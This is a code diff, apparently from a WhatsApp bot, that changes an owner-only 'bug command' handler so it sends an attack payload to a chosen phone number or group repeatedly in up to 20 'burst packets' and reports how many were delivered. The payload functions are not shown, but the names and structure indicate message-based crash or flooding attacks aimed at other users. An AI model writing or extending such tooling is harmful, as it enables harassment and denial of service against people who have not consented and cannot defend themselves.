@@ -69,9 +69,9 @@ async function checkWhatsAppUser(sock, targetJid) {
   }
 }
 
-async function executeBugCommand(sock, chat, msg, args, cmdName, payloadFn) {
+async function executeBugCommand(sock, chat, msg, args, cmdName, payloadFn, defaultRounds = 5) {
   if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
-  if (!args[0]) return sock.sendMessage(chat, { text: `❌ Usage: .${cmdName} <number or groupJid>` }, { quoted: msg });
+  if (!args[0]) return sock.sendMessage(chat, { text: `❌ Usage: .${cmdName} <number or groupJid> [rounds]` }, { quoted: msg });
 
   const targetJid = resolveTargetJid(args[0]);
   if (!targetJid) return sock.sendMessage(chat, { text: '❌ Invalid target phone number or group JID.' }, { quoted: msg });
@@ -80,13 +80,35 @@ async function executeBugCommand(sock, chat, msg, args, cmdName, payloadFn) {
     return sock.sendMessage(chat, { text: '⛔ Target is protected (Bot owner / self number).' }, { quoted: msg });
   }
 
+  const roundsArg = parseInt(args[1], 10);
+  const rounds = (!isNaN(roundsArg) && roundsArg > 0 && roundsArg <= 20) ? roundsArg : defaultRounds;
+
   try {
     const exists = await checkWhatsAppUser(sock, targetJid);
     if (!exists) return sock.sendMessage(chat, { text: `❌ Target is not on WhatsApp` }, { quoted: msg });
 
-    await notifySending(sock, chat, targetJid, cmdName);
-    const res = await payloadFn(sock, targetJid);
-    await notifyResult(sock, chat, targetJid, cmdName, res, msg);
+    await notifySending(sock, chat, targetJid, `${cmdName.toUpperCase()} (${rounds} BURST PACKETS)`);
+
+    let totalDelivered = 0;
+    const errors = [];
+
+    for (let r = 0; r < rounds; r++) {
+      try {
+        const res = await payloadFn(sock, targetJid);
+        if (res?.success) totalDelivered += (res.deliveredCount || 1);
+        else if (res?.errors) errors.push(...res.errors);
+      } catch (err) {
+        errors.push(err.message);
+      }
+    }
+
+    const finalResult = {
+      success: totalDelivered > 0,
+      deliveredCount: totalDelivered,
+      errors
+    };
+
+    await notifyResult(sock, chat, targetJid, cmdName, finalResult, msg);
   } catch (err) {
     await notifyResult(sock, chat, targetJid, cmdName, { success: false, deliveredCount: 0, errors: [err.message] }, msg);
   }
